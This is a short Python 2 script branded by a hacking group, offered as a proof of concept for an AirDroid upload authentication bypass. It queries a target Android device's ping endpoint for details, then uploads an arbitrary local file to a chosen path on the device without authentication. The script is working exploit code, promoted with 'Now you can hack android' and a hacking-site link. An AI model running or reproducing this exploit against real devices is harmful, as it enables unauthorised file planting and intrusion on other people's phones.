#!/usr/bin/env python
# -*- coding:utf-8 -*-
import json , sys , hashlib , os , time , marshal , random

import sys,requests,re,urllib2



# colour
G = "\033[35m"; O = "\033[36m"; B = "\033[37m"; R = "\033[38m"; W = "\033[0m"; P = "\033[39m";

print O+("")
mess = """
        ____                _                             _
     |___ \              | |                           | |
  ____ __) |_ __ ___   __| | __ _ _   _   ___ _   _  __| | __ _ _ __
 |_  /|__ <| '__/ _ \ / _` |/ _` | | | | / __| | | |/ _` |/ _` | '_ \
  / / ___) | | | (_) | (_| | (_| | |_| | \__ \ |_| | (_| | (_| | | | |
 /___|____/|_|  \___/ \__,_|\__,_|\__, | |___/\__,_|\__,_|\__,_|_| |_|
                                   __/ |
                                  |___/
                                                         """

print mess
print "                          create  Team-Z3roday"
print "                         script Poc Android "
print "  Note :▂▃▄▅▆▇█▓▒░     Now you can hack android   ░▒▓█▇▆▅▄▃▂"



def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.3)
mengetik('&_<︻╦̵̵͇̿̿̿̿ vist our site ╤───.......┣▇ https://hackwpi.com  ▇▇▇▇▇═─  \n\n')




def logo():
 
 print "\t AIRDROID UPLOAD AUTH BYPASS PoC <<<<telegram content >>>>____@ frogsec"
if len(sys.argv)<6 or len(sys.argv)>6 :
 logo()
 print "\tUSAGE:python pocandro.py ip port remote-file-name local-file-name remote-file-path"
 print "\tEXAMPLE:python pocandro.py 192.168.1.2 5555 poc poc.txt /sdcard"
else :
 logo()
 print "\n[+]Reciving Details\n-----------------------------"
 try : 
  p = requests.get('http://'+sys.argv[1]+':'+sys.argv[2]+'/sdctl/comm/ping/') 
 except IOError :
  print "\n[!] Check If server is Running"
  sys.exit()
 for i in p.content.split(',') :
  for char in '{"}_': 
   i = i.replace(char,'').upper()
  print "[*]"+i+""
 print "\n[+]Sending File\n-----------------------------"
 try :  
  r = requests.post('http://'+sys.argv[1]+':'+sys.argv[2]+'/sdctl/comm/upload/dir?fn='+sys.argv[3]+'&d='+sys.argv[5]+'&after=1&fname='+sys.argv[3], files={sys.argv[4]: open(sys.argv[4], 'rb').read()})
  if (r.status_code == 200) :
   print "[*]RESPONSE:200"
   print "[*]FILE SENT SUCCESSFULY"
 except IOError :
  print "\n[!] Error"
